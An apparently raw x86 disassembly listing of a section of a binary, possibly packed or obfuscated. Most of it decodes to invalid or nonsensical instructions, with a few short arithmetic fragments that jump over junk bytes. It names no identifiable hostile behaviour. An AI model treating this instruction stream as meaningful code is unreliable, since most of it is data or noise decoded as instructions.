  413529:	and    eax,DWORD PTR [ebx+0x2e]
  41352c:	iret   
  41352d:	jp     0x41356f
  41352f:	(bad)  
  413530:	xchg   ebx,eax
  413531:	jnp    0x413522
  413533:	and    ah,cl
  413535:	aam    0xb0
  413537:	int    0xac
  413539:	and    eax,0x1049beb9
  41353e:	adc    eax,0x63f89a7e
  413543:	std    
  413544:	je     0x413546
  413546:	call   0xccdc:0x7dc2a9db
  41354d:	jne    0x413524
  41354f:	sub    al,0x7c
  413551:	popa   
  413552:	frstor [ecx+0x61653fc4]
  413558:	loopne 0x41353c
  41355a:	mov    ebp,0xb2c551f9
  41355f:	mov    al,ds:0xbdb888b6
  413564:	out    0xee,al
  413566:	pminsw mm1,QWORD PTR [esi]
  413569:	pop    ecx
  41356a:	xor    dh,dl
  41356c:	(bad)  
  41356d:	cli    
  41356e:	ds pop ebp
  413570:	shr    bh,1
  413572:	mov    ah,0x76
  413574:	jl     0x41356d
  413576:	out    dx,al
  413577:	push   edi
  413578:	or     DWORD PTR [eax-0x4],0xbac0cd77
  41357f:	mov    edx,0xc2b0a2bc
  413584:	outs   dx,BYTE PTR ds:[esi]
  413585:	mov    dh,0x2a
  413587:	repnz dec esi
  413589:	or     al,0x4b
  41358b:	mov    DWORD PTR cs:[edi+ecx*2+0x769ad4bf],ecx
  413593:	loopne 0x4135f3
  413595:	mov    esi,0x776595c7
  41359a:	inc    esp
  41359b:	lods   al,BYTE PTR ds:[esi]
  41359c:	pop    ebp
  41359d:	cmp    DWORD PTR [ebx],ebx
  41359f:	(bad)  
  4135a1:	retf   
  4135a2:	pop    ecx
  4135a3:	xchg   DWORD PTR [ecx+0x1ce9909d],ebx
  4135a9:	xor    DWORD PTR [ebx+0x68],0xaff041e4
  4135b0:	loope  0x413579
  4135b2:	push   ebp
  4135b3:	jae    0x4135d3
  4135b5:	cmp    ch,bh
  4135b7:	pop    DWORD PTR [esi+0x22cc0654]
  4135bd:	mov    ds:0x1bea4168,eax
  4135c2:	das    
  4135c3:	mov    al,ds:0x897dca1
  4135c8:	push   0x60
  4135ca:	xchg   DWORD PTR [edi+0x9334b4b],ebx
  4135d0:	repnz push DWORD PTR [ebx]
  4135d3:	loop   0x413567
  4135d5:	scas   eax,DWORD PTR es:[edi]
  4135d6:	push   ebx
  4135d7:	xchg   edx,eax
  4135d8:	outs   dx,BYTE PTR ds:[esi]
  4135d9:	scas   al,BYTE PTR es:[edi]
  4135da:	sar    dh,0x51
  4135dd:	enter  0x48e8,0xd3
  4135e1:	pop    esp
  4135e2:	and    BYTE PTR [ecx],bh
  4135e4:	adc    DWORD PTR [ecx-0x72],esi
  4135e7:	dec    esp
  4135e8:	(bad)  
  4135e9:	retf   
  4135ea:	mov    al,bl
  4135ec:	sbb    eax,0x4ba7ba58
  4135f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f2:	stos   BYTE PTR es:[edi],al
  4135f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135f4:	xor    al,0xc
  4135f6:	or     dh,BYTE PTR [ecx-0x40]
  4135f9:	push   esp
  4135fa:	push   ecx
  4135fb:	jae    0x4135b9
  4135fd:	ss gs push edx
  413600:	(bad)  
  413601:	(bad)  
  413603:	loop   0x413621
  413605:	inc    ebp
  413606:	out    dx,eax
  413607:	cmp    eax,0x3080acc8
  41360c:	mov    ebx,0x54d61899
  413611:	mov    dh,0xc
  413613:	mov    bh,0xb2
  413615:	rcl    dh,0x31
  413618:	mov    ds:0x3dbd6d17,al
  41361d:	(bad)  
  41361e:	(bad)  
  413620:	call   0xa538:0x73c9efe5
  413627:	inc    ebp
  413628:	mov    ebp,0x1a8cb3ca
  41362d:	xchg   ebp,eax
  41362e:	arpl   WORD PTR [edx+0x64],cx
  413631:	adc    ebp,0xf869ff8a
  413637:	mov    dl,0xa6
  413639:	pop    edi
  41363a:	sbb    bh,bl
  41363c:	jbe    0x41360b
  41363e:	bound  ecx,QWORD PTR [edx]
  413640:	bswap  esp
  413642:	cmp    al,0x40
  413644:	push   ss
  413645:	test   DWORD PTR [edx],ebx
  413647:	pusha  
  413648:	dec    ebx
  413649:	add    cl,dh
  41364b:	jae    0x413675
  41364d:	es jnp 0x4136bf
  413650:	fnsave [esi+0x2e566e90]
  413656:	(bad)  
  413657:	add    al,0x20
  413659:	or     DWORD PTR [edx+esi*4],0xdc32d0e1
  413660:	test   BYTE PTR [esi+0x6032e4f8],bh
  413666:	ret    
  413667:	mov    ebp,0xa425e7a2
  41366c:	sub    bl,BYTE PTR [eax+0x3e1b1c8c]
  413672:	sbb    ebp,DWORD PTR [ebp-0x41b1e95e]
  413678:	retf   0x6e13
  41367b:	in     al,dx
  41367c:	sub    dl,BYTE PTR ds:0x270f0527
  413682:	mov    bl,0x2b
  413684:	mov    ebx,0xdf1a7b55
  413689:	imul   edx,DWORD PTR [ecx-0xc],0xffffffde
  41368d:	aas    
  41368e:	gs cwde 
  413690:	fld    TBYTE PTR [edi+0x2]
  413693:	jae    0x41367f
  413695:	jb     0x4136b8
  413697:	push   ebp
  413698:	or     eax,0xd45841e5
  41369d:	adc    dh,BYTE PTR [ebx+0x2e]
  4136a0:	sub    al,0x5
  4136a2:	out    0xee,eax
  4136a4:	jle    0x4136a3
  4136a6:	in     eax,dx
  4136a7:	lea    ebx,[eax]
  4136a9:	pusha  
  4136aa:	add    al,0xed
  4136ac:	push   0x6f1fdf6d
  4136b1:	adc    eax,edi
  4136b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136b5:	jae    0x4136e5
  4136b7:	xor    esi,edx
  4136b9:	push   esi
  4136ba:	sbb    DWORD PTR [eax-0x4602f586],ecx
  4136c0:	and    bh,ah
  4136c2:	xchg   ah,cl
  4136c4:	ss fsub st,st(2)
  4136c7:	aam    0xff
  4136c9:	sub    DWORD PTR [ecx],edi
  4136cb:	xlat   BYTE PTR cs:[bx]
  4136ce:	fadd   st,st(5)
  4136d0:	ss (bad) 
  4136d2:	mov    ebp,0x8bbc558b
  4136d7:	jge    0x4136cd
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp+0x44e17219]
  4136f4:	imul   esi,DWORD PTR [ebp+0x28],0x7d
  4136f8:	jg     0x413772
  4136fa:	in     eax,0x7e
  4136fc:	js     0x413776
  4136fe:	icebp  
  4136ff:	call   0x6d12:0x6a03ee1b
  413706:	xor    bl,0x22
  413709:	out    dx,al
  41370a:	int    0xc0
  41370c:	popa   
  41370d:	pop    edx
  41370e:	test   BYTE PTR [ebp+0x45],bl
  413711:	add    al,0x22
  413713:	mov    bh,BYTE PTR [edx+0x3a52a040]
  413719:	add    eax,0x908e4e6a
  41371e:	aad    0x0
  413720:	retf   
  413721:	sub    BYTE PTR [edx-0x2094e37e],0x1f
  413728:	cmp    eax,0xda55c33f
  41372d:	add    bl,cl
  41372f:	mov    eax,ds:0xbfd99bd5
  413735:	test   DWORD PTR [ebp-0x15fc6392],0x8dab1225
  41373f:	aaa    
  413740:	cwde   
  413741:	enter  0x3063,0x50
  413745:	sub    BYTE PTR [eax+0x74f24547],cl
  41374b:	push   eax
  41374c:	jg     0x41370b
  41374e:	xchg   edi,eax
  41374f:	retf   
  413750:	jp     0x413776
  413752:	inc    ebp
  413753:	mov    ecx,0x68183535
  413758:	mov    ecx,0xf448d0df
  41375d:	lahf   
  41375e:	xor    edi,DWORD PTR [eax+0x51]
  413761:	pop    ax
  413763:	mov    eax,0x79cfc619
  413768:	clc    
  413769:	stos   BYTE PTR es:[edi],al
  41376a:	dec    eax
  41376b:	aas    
  41376c:	lea    ecx,[ecx+0x65]
  41376f:	or     BYTE PTR [ecx],0xbd
  413772:	mov    DWORD PTR [edx],edi
  413774:	stos   BYTE PTR es:[edi],al
  413775:	and    edi,ebx
  413777:	inc    esp
  413778:	xor    eax,0x4f34673a
  41377d:	cmp    BYTE PTR [ecx+0x51],dl
  413780:	mov    BYTE PTR [ebx],al
  413782:	shl    BYTE PTR [ebp-0x4c85757],cl
  413788:	rcr    DWORD PTR [ebx-0x72],cl
  41378b:	jmp    0x281173c4
  413790:	sbb    BYTE PTR [eax],cl
  413792:	fcom   QWORD PTR [ecx-0x15b5c543]
  413798:	mov    eax,ds:0xbe940cd
  41379d:	int    0x12
  41379f:	in     eax,dx
  4137a0:	sub    BYTE PTR [ecx-0x31],dl
  4137a3:	sub    DWORD PTR [edx+edx*1+0x138808d3],eax
  4137aa:	adc    cl,BYTE PTR [ecx+0x11]
  4137ad:	call   0xe43a:0xd6819bbe
  4137b4:	jl     0x413795
  4137b6:	push   ebp
  4137b7:	mov    ebp,0x3bfcf743
  4137bc:	xchg   esi,eax
  4137bd:	aas    
  4137be:	sti    
  4137bf:	call   0x304:0x5ddefec5
  4137c6:	retf   0xd7b9
  4137c9:	add    ecx,DWORD PTR [edi]
  4137cb:	into   
  4137cc:	mov    ebx,0xc49f271d
  4137d1:	stos   DWORD PTR es:[edi],eax
  4137d2:	push   cs
  4137d3:	push   es
  4137d4:	pop    ds
  4137d5:	adc    eax,0xbe7eb06d
  4137da:	nop
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	(bad)  
  4137dd:	(bad)  
  4137de:	fisttp QWORD PTR [edx]
  4137e0:	out    0x3c,al
  4137e2:	jns    0x413769
  4137e4:	out    0x67,eax
  4137e6:	sbb    ah,dh
  4137e8:	aam    0x9d
  4137ea:	pop    ecx
  4137eb:	stc    
  4137ec:	xchg   esp,eax
  4137ed:	ins    DWORD PTR es:[edi],dx
  4137ee:	daa    
  4137ef:	enter  0x9db,0xce
  4137f3:	lds    ebp,FWORD PTR [ebp+0x1da651d4]
  4137f9:	adc    ecx,DWORD PTR [ebx]
  4137fb:	jp     0x413850
  4137fd:	adc    BYTE PTR [ecx-0x3116919d],0x7e
  413804:	jo     0x413829
  413806:	jg     0x413788
  413808:	sub    BYTE PTR [esp+edx*4],0x5a
  41380c:	popa   
  41380d:	jecxz  0x4137c4
  41380f:	xchg   esi,eax
  413810:	pushf  
  413811:	pop    ecx
  413812:	in     al,0x2
  413814:	cpuid  
  413816:	xor    DWORD PTR [edx],edi
  413818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413819:	pop    ss
  41381a:	add    ebx,DWORD PTR [ebp-0x1d]
  41381d:	mov    eax,edi
  41381f:	xor    al,0x3d
  413821:	shl    BYTE PTR [esi],1
  413823:	jle    0x413822
  413825:	add    cl,BYTE PTR [edx+edx*8+0x63f4be1c]
  41382c:	push   eax
  41382d:	sub    DWORD PTR [edx+0x2be1e950],ebx
  413833:	push   ecx
  413834:	mov    ecx,0x80c0ae45
  413839:	pusha  
  41383a:	rol    eax,cl
  41383c:	loopne 0x413824
  41383e:	sub    DWORD PTR [eax-0x7a9ceb19],edx
  413844:	fwait
  413845:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413847:	shl    BYTE PTR [edi],0x53
  41384a:	cmc    
  41384b:	xor    DWORD PTR [eax+0x46],ebp
  41384e:	add    BYTE PTR [eax+0x74e66b34],ah
  413854:	in     al,0x5a
  413856:	int    0x36
  413858:	pop    esp
  413859:	mov    bl,0xbc
  41385b:	inc    ebp
  41385c:	mov    eax,0x6389d929
  413861:	jle    0x413821
  413863:	das    
  413864:	add    ebx,edi
  413866:	imul   ah
  413868:	lock pop edi
  41386a:	jae    0x4138db
  41386c:	xor    ch,BYTE PTR [edi+0x5d31022e]
  413872:	addr16 inc ebx
  413874:	jl     0x413882
  413876:	cli    
  413877:	sahf   
  413878:	adc    al,0x56
  41387a:	push   edi
  41387b:	pop    esi
  41387c:	(bad)  
  41387d:	out    0x9f,eax
  41387f:	xchg   ecx,eax
  413880:	cdq    
  413881:	aas    
  413882:	pop    eax
  413883:	adc    al,0xfa
  413885:	cwde   
  413886:	nop
  413887:	inc    edi
  413888:	sbb    dh,BYTE PTR [eax]
  41388a:	les    ebx,FWORD PTR [ebp+0x1b3903af]
  413890:	pusha  
  413891:	(bad)  
  413892:	scas   al,BYTE PTR es:[edi]
  413893:	mov    ecx,0xc32ff454
  413898:	repnz into 
  41389a:	pop    esp
  41389b:	int    0x52
  41389d:	mov    bh,0x3b
  41389f:	push   0x6e4d97db
  4138a4:	addr16 inc edi
  4138a6:	(bad)  
  4138a7:	stos   BYTE PTR es:[edi],al
  4138a8:	jl     0x413867
  4138aa:	scas   eax,DWORD PTR es:[edi]
  4138ab:	es out 0x1d,eax
  4138ae:	ficomp DWORD PTR [ecx+edx*1+0x6cdd3098]
  4138b5:	add    al,0x1e
  4138b7:	and    esp,DWORD PTR [edi]
  4138b9:	sbb    DWORD PTR [ebp-0x29786586],edx
  4138bf:	mov    dh,0xbd
  4138c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138c2:	pop    edx
  4138c3:	ja     0x4138fa
  4138c5:	daa    
  4138c6:	sub    eax,0x52fa5f98
  4138cb:	adc    ebx,DWORD PTR [ebp+eax*2+0xecef90b]
  4138d2:	pop    edi
  4138d3:	and    eax,0xca045f57
  4138d8:	test   BYTE PTR [esi],0xe4
  4138db:	jg     0x41389b
  4138dd:	or     ecx,DWORD PTR [eax+0x3f]
  4138e0:	mov    edx,0x6a3aa71d
  4138e5:	bnd ret 
  4138e7:	mov    ds:0x4e8be2ab,eax
  4138ec:	add    al,bl
  4138ee:	jne    0x4138bf
  4138f0:	add    eax,0xc21275ee
  4138f5:	add    al,0x1e
  4138f7:	sbb    al,0xe
  4138f9:	inc    esp
  4138fa:	mov    bl,0xdd
  4138fc:	ins    DWORD PTR es:[edi],dx
  4138fd:	mov    ebx,0xe2992998
  413902:	jp     0x413949
  413904:	mov    eax,ds:0x226d0dcc
  413909:	leave  
  41390a:	cmp    al,0xaf
  41390c:	sub    al,0x49
  41390e:	xchg   BYTE PTR ds:0x5310bddf,bl
  413914:	or     DWORD PTR [ecx-0x6],edi
  413917:	mov    ebx,0x36b63832
  41391c:	xor    edi,DWORD PTR [ebp+0x3e04f791]
  413922:	mov    esi,0xd71de4c4
  413927:	push   edx
  413928:	xchg   ebx,eax
  413929:	ins    DWORD PTR es:[edi],dx
  41392a:	jo     0x41398a
  41392c:	leave  
  41392d:	cmc    
  41392e:	sub    edi,0x53446161
  413934:	clc    
  413935:	mov    BYTE PTR [edi-0x6d],0x2
  413939:	jmp    0x5ac0:0x8f05f987
  413940:	div    BYTE PTR [esp+eax*2]
  413943:	push   0xced874ca
  413948:	stos   BYTE PTR es:[edi],al
  413949:	and    esi,edi
  41394b:	mov    ebx,DWORD PTR [edx-0x34]
  41394e:	aaa    
  41394f:	pop    edx
  413950:	xchg   BYTE PTR [ebx],bl
  413952:	add    al,0x99
  413954:	pop    ss
  413955:	mov    WORD PTR [ecx-0x59],es
  413958:	push   cs
  413959:	sub    eax,0x4f1510ec
  41395e:	mov    esp,0x6ac75a68
  413963:	scas   al,BYTE PTR es:[edi]
  413964:	jo     0x413976
  413966:	dec    edi
  413967:	loope  0x413942
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x413925
  413996:	ret    
  413997:	es pusha 
  413999:	xchg   ebp,eax
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	(bad)  
  4139a2:	repnz cmp al,0x9b
  4139a5:	xor    BYTE PTR ss:[eax],al
  4139a8:	retf   
  4139a9:	ret    
  4139aa:	mov    bl,ch
  4139ac:	(bad)  
  4139ad:	mov    bl,0xab
  4139af:	or     al,0xf7
  4139b1:	fisttp DWORD PTR [eax-0x629e2dfd]
  4139b7:	in     eax,0x19
  4139b9:	mov    eax,0xfde38259
  4139be:	add    al,0xca
  4139c0:	or     BYTE PTR [ebx],0x22
  4139c3:	dec    edx
  4139c4:	popa   
  4139c5:	xlat   BYTE PTR ds:[ebx]
  4139c6:	mov    cl,dl
  4139c8:	repz rcr BYTE PTR [edx],cl
  4139cb:	inc    ebp
  4139cc:	imul   ebx,edx,0x6d
  4139cf:	push   ds
  4139d0:	je     0x41396c
  4139d2:	jmp    0x413964
  4139d4:	add    ebx,DWORD PTR [ebx]
  4139d6:	xchg   esi,eax
  4139d7:	xlat   BYTE PTR ds:[ebx]
  4139d8:	jge    0x413a12
  4139da:	sub    eax,0x45f4c7b5
  4139df:	fs in  eax,dx
  4139e1:	xchg   ebp,eax
  4139e2:	pop    edx
  4139e3:	unpckhps xmm3,XMMWORD PTR [ebx]
  4139e6:	inc    bp
  4139e8:	sub    BYTE PTR [ebx+edx*1+0x6b],0x45
  4139ed:	mov    ds:0x382f80eb,al
  4139f2:	adc    edi,DWORD PTR [esi]
  4139f4:	sbb    cl,BYTE PTR [esi+edi*1]
  4139f7:	sbb    cl,BYTE PTR [bx+di-0x17]
  4139fb:	sub    DWORD PTR cs:0x5c033bfd,eax
  413a02:	mov    bl,BYTE PTR [esi+esi*4]
  413a05:	ror    dl,0x51
  413a08:	nop
  413a09:	lahf   
  413a0a:	jnp    0x413a2d
  413a0c:	fstp   TBYTE PTR [ebp-0x42]
  413a0f:	inc    ebx
  413a10:	xchg   ebx,eax
  413a11:	ret    0xa408
  413a14:	scas   eax,DWORD PTR es:[edi]
  413a15:	rol    DWORD PTR [ebx+esi*2],cl
  413a18:	repnz and BYTE PTR gs:[esi+ebp*2+0x3da75489],bl
  413a21:	imul   si,si,0xffd9
  413a25:	xor    BYTE PTR [esi+ebp*1],cl
  413a28:	mov    ?,ebp
  413a2a:	fs test DWORD PTR cs:0xa9c05b6f,ecx
  413a32:	xor    dl,BYTE PTR [ebx+0x35]
  413a35:	in     al,dx
  413a36:	mov    eax,esp
  413a38:	fisttp WORD PTR [ebx+0x5d]
  413a3b:	and    BYTE PTR [edi+ecx*4+0x661fbf3b],ah
  413a42:	or     edx,esi
  413a44:	add    al,0x2
  413a46:	loope  0x413aa7
  413a48:	pop    edx
  413a49:	sub    ch,0x35
  413a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a4d:	or     DWORD PTR [ebx+0x28d8062c],0x3aacc334
  413a57:	mov    al,0x36
  413a59:	xchg   DWORD PTR [eax-0x51f02732],ebx
  413a5f:	push   ds
  413a60:	lods   eax,DWORD PTR ds:[esi]
  413a61:	adc    BYTE PTR [esi+ebx*1],0x94
  413a65:	out    dx,al
  413a66:	sbb    eax,0x64c2c753
  413a6b:	fst    QWORD PTR [ebx-0x43]
  413a6e:	loopne 0x413ad4
  413a70:	aad    0x42
  413a72:	mov    esp,0xcc8bdeba
  413a77:	adc    edi,edi
  413a79:	sbb    al,0x28
  413a7b:	mov    ebx,0x38154879
  413a80:	push   cs
  413a81:	in     al,0x8a
  413a83:	mov    ebp,es
  413a85:	push   edx
  413a86:	xchg   edx,ebp
  413a88:	sub    eax,0x84da98eb
  413a8d:	sbb    eax,0x723f717e
  413a92:	push   edi
  413a93:	fldenv [esi+ecx*1-0x4b543416]
  413a9a:	fsubr  DWORD PTR [bx+di+0x68]
  413a9e:	repnz imul ecx,DWORD PTR [ebp-0x34a91ec2],0xa
  413aa6:	push   ss
  413aa7:	sbb    DWORD PTR [ecx-0x1e],ecx
  413aaa:	fbld   TBYTE PTR [eax]
  413aac:	dec    ecx
  413aad:	inc    eax
  413aae:	pushf  
  413aaf:	dec    ebp
  413ab0:	cmc    
  413ab1:	std    
  413ab2:	adc    DWORD PTR [esi-0x10],0x31
  413ab6:	sbb    DWORD PTR gs:[ecx-0x3b735ab1],esi
  413abd:	mov    cl,0x69
  413abf:	xor    al,0x15
  413ac1:	popf   
  413ac2:	and    BYTE PTR [eax],dh
  413ac4:	dec    eax
  413ac5:	push   ebp
  413ac6:	push   eax
  413ac7:	outs   dx,DWORD PTR ds:[esi]
  413ac8:	jmp    0x413a88
  413aca:	mov    bl,0x72
  413acc:	push   0xc0055135
  413ad1:	adc    dl,ah
  413ad3:	js     0x413ac4
  413ad5:	jg     0x413b24
  413ad7:	lahf   
  413ad8:	or     esi,DWORD PTR [esp+esi*4]
  413adb:	push   0xfffffff8
  413add:	pop    eax
  413ade:	xor    ah,cl
  413ae0:	loopne 0x413b01
  413ae2:	jo     0x413a7b
  413ae4:	push   edx
  413ae5:	jb     0x413b03
  413ae7:	(bad)  
  413ae8:	sar    DWORD PTR [ecx-0x71024c9c],cl
  413aee:	fnstenv [edi+0x1b]
  413af1:	daa    
  413af2:	(bad)  
  413af4:	or     dh,BYTE PTR [eax-0x22]
  413af7:	sbb    eax,0xc7333d76
  413afc:	xchg   ecx,eax
  413afd:	inc    esi
  413afe:	xchg   BYTE PTR [edx-0x6a],al
  413b01:	push   edx
  413b02:	shr    BYTE PTR [edx+0x1ad2ba32],cl
  413b08:	ret    
  413b09:	out    dx,al
  413b0a:	sub    DWORD PTR [eax],esp
  413b0c:	push   esi
  413b0d:	cmp    al,0x9c
  413b0f:	dec    ebp
  413b10:	xchg   ebx,eax
  413b11:	pop    es
  413b12:	add    ebp,DWORD PTR [edx+0x576acdd]
  413b18:	inc    edi
  413b19:	xor    BYTE PTR [edx-0x68],0xef
  413b1d:	xor    ah,BYTE PTR [ebp-0x5fcc3eba]
  413b23:	icebp  
  413b24:	data16 mov ch,0x1a
  413b27:	retf   
  413b28:	push   cs
  413b29:	sub    DWORD PTR [edx+0x26ab2b5],eax
  413b2f:	xchg   esi,eax
  413b30:	inc    eax
  413b31:	lahf   
  413b32:	push   ecx
  413b33:	push   ss
  413b34:	pop    esp
  413b35:	call   0x30cc8411
  413b3a:	idiv   DWORD PTR [ecx-0x27]
  413b3d:	push   0x6473efc1
  413b42:	jmp    0x413af4
  413b44:	and    eax,0x36bd847c
  413b49:	pop    edi
  413b4a:	out    0x58,al
  413b4c:	jb     0x413ae0
  413b4e:	out    dx,al
  413b4f:	sbb    DWORD PTR [edi+0x61],ebp
  413b52:	jo     0x413b81
  413b54:	inc    esp
  413b55:	repz and al,0xfa
  413b58:	fs mov dh,0x92
  413b5b:	and    al,0xae
  413b5d:	xor    DWORD PTR [esi-0x60],eax
  413b60:	mov    bl,0x51
  413b62:	cmp    al,0xfa
  413b64:	xchg   ebp,eax
  413b65:	stos   DWORD PTR es:[edi],eax
  413b66:	(bad)  
  413b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b68:	lock dec esp
  413b6a:	push   cs
  413b6b:	and    cl,BYTE PTR [esi+0xbcd6121]
  413b71:	daa    
  413b72:	aas    
  413b73:	dec    ebx
  413b74:	test   edi,edx
  413b76:	(bad)  
  413b77:	rol    DWORD PTR [ebp-0x247e15dc],1
  413b7d:	and    edi,DWORD PTR [ebx+0x5e2b466a]
  413b83:	arpl   dx,cx
  413b85:	inc    ebx
  413b86:	syscall 
  413b88:	(bad)  
  413b89:	adc    bl,dl
  413b8b:	dec    edi
  413b8c:	nop
  413b8d:	sbb    ecx,DWORD PTR [eax+0x22]
  413b90:	pop    edx
  413b91:	iret   
  413b92:	mov    WORD PTR [ebp+0xaf56686],?
  413b98:	(bad)  
  413b99:	hlt    
  413b9a:	push   0xffffff93
  413b9c:	arpl   bx,si
  413b9e:	adc    eax,0x5e36fc4
  413ba3:	mov    bl,0xe1
  413ba5:	mov    DWORD PTR [ebx-0x6a],edi
  413ba8:	ins    DWORD PTR es:[edi],dx
  413ba9:	cmc    
  413baa:	add    esi,DWORD PTR [esi-0x7e154822]
  413bb0:	pop    edi
  413bb1:	test   al,0xc6
  413bb3:	mov    DWORD PTR [edx+0x55874824],eax
  413bb9:	scas   eax,DWORD PTR es:[edi]
  413bba:	xor    DWORD PTR [edi+0x12],0x6e
  413bbe:	push   edx
  413bbf:	adc    DWORD PTR [ecx],0xb72059af
  413bc5:	(bad)  
  413bc6:	push   cs
  413bc7:	fnstsw WORD PTR [esi+0x8]
  413bca:	and    eax,0x24734fd6
  413bcf:	jnp    0x413c06
  413bd1:	ror    BYTE PTR [ecx],cl
  413bd3:	sbb    ch,BYTE PTR [edi]
  413bd5:	rcr    BYTE PTR [ecx+edx*2+0x54a686e7],1
  413bdc:	mov    bh,0x70
  413bde:	jecxz  0x413c3f
  413be0:	pop    ss
  413be1:	pop    edi
  413be2:	cmp    DWORD PTR [eax+0x16d1f209],0x78a6d911
  413bec:	in     al,dx
  413bed:	xchg   DWORD PTR [edi],esp
  413bef:	cmc    
  413bf0:	imul   edx,DWORD PTR ds:0x239498eb,0xffffffbb
  413bf7:	mov    esi,0x8524521c
  413bfc:	int    0x3d
  413bfe:	jecxz  0x413bc0
  413c00:	icebp  
  413c01:	cmp    ebx,DWORD PTR [eax]
  413c03:	test   al,0xd0
  413c05:	arpl   WORD PTR [esi],sp
  413c07:	xor    eax,DWORD PTR [edi+0x2bfadea3]
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	cld    
  413c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c2b:	out    dx,al
  413c2c:	push   edx
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	aad    0x7b
  413c37:	popa   
  413c38:	rcr    DWORD PTR [edi-0x5880a38],0xce
  413c3f:	sub    esp,DWORD PTR [esi+0x39]
  413c42:	sub    ebx,esp
  413c44:	daa    
  413c45:	jb     0x413be9
  413c47:	cld    
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	sar    esi,0x85
  413c4c:	popf   
  413c4d:	xchg   ebp,eax
  413c4e:	sbb    al,0x17
  413c50:	cmp    dh,BYTE PTR [edi-0x6c]
  413c53:	stos   DWORD PTR es:[edi],eax
  413c54:	sti    
  413c55:	dec    ecx
  413c56:	test   DWORD PTR [esi-0x61],esp
  413c59:	ret    
  413c5a:	jne    0x413c54
  413c5c:	(bad)  
  413c5e:	jge    0x413c61
  413c60:	jp     0x413c52
  413c62:	test   BYTE PTR [edi+0x25130c6e],dl
  413c68:	push   esi
  413c69:	sbb    al,0x9d
  413c6b:	or     al,0x44
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	outs   dx,BYTE PTR ds:[esi]
  413c6f:	mov    es,WORD PTR [eax]
  413c71:	or     al,0x8
  413c73:	push   es
  413c74:	ret    
  413c75:	lahf   
  413c76:	lahf   
  413c77:	push   0x58
  413c79:	xchg   BYTE PTR [edi-0x59e2b143],dl
  413c7f:	cli    
  413c80:	or     DWORD PTR [eax+0x6ba5cc4],ebp
  413c86:	sub    ebx,0xb69b5cfb
  413c8c:	inc    esi
  413c8d:	jb     0x413c9b
  413c8f:	or     ch,ah
  413c91:	ficomp WORD PTR [ebp+0x38834374]
  413c97:	inc    esi
  413c98:	fimul  DWORD PTR [eax]
  413c9a:	pushf  
  413c9b:	lods   eax,DWORD PTR ds:[esi]
  413c9c:	and    eax,0x76696741
  413ca1:	(bad)  
  413ca2:	mov    ch,0x87
  413ca4:	pop    edi
  413ca5:	inc    esi
  413ca6:	clc    
  413ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ca8:	dec    esi
  413ca9:	cmpps  xmm5,XMMWORD PTR [esi],0xfe
  413cad:	dec    ebx
  413cae:	es aaa 
  413cb0:	add    BYTE PTR [edx],dl
  413cb2:	mov    edx,0x7a419dfb
  413cb7:	inc    edx
  413cb8:	sub    BYTE PTR [edi-0x50],dl
  413cbb:	clc    
  413cbc:	std    
  413cbd:	xor    DWORD PTR [esi],esp
  413cbf:	mov    eax,0x2f6a319
  413cc4:	jle    0x413cac
  413cc6:	sbb    DWORD PTR [ecx],ebp
  413cc8:	in     eax,0xb2
  413cca:	ds mov bl,ch
  413ccd:	mov    ecx,gs
  413ccf:	pop    ds
  413cd0:	add    BYTE PTR [esi+0x4d],0xdc
  413cd4:	cmp    al,0x1f
  413cd6:	mov    esp,0x439770ef
  413cdb:	stos   BYTE PTR es:[edi],al
  413cdc:	add    al,0x62
  413cde:	mov    edi,0x90e2c672
  413ce3:	mov    BYTE PTR [edi],ah
  413ce5:	inc    edi
  413ce6:	add    BYTE PTR [esi+0x4060667c],cl
  413cec:	push   edi
  413ced:	pusha  
  413cee:	and    DWORD PTR [edx+edx*1+0x5dade14e],edx
  413cf5:	mov    BYTE PTR [eax-0x430477c8],cl
  413cfb:	mov    dl,0x79
  413cfd:	jnp    0x413d25
  413cff:	(bad)  [ebx-0x7536b964]
  413d05:	sbb    eax,0x50d04ade
  413d0a:	lahf   
  413d0b:	icebp  
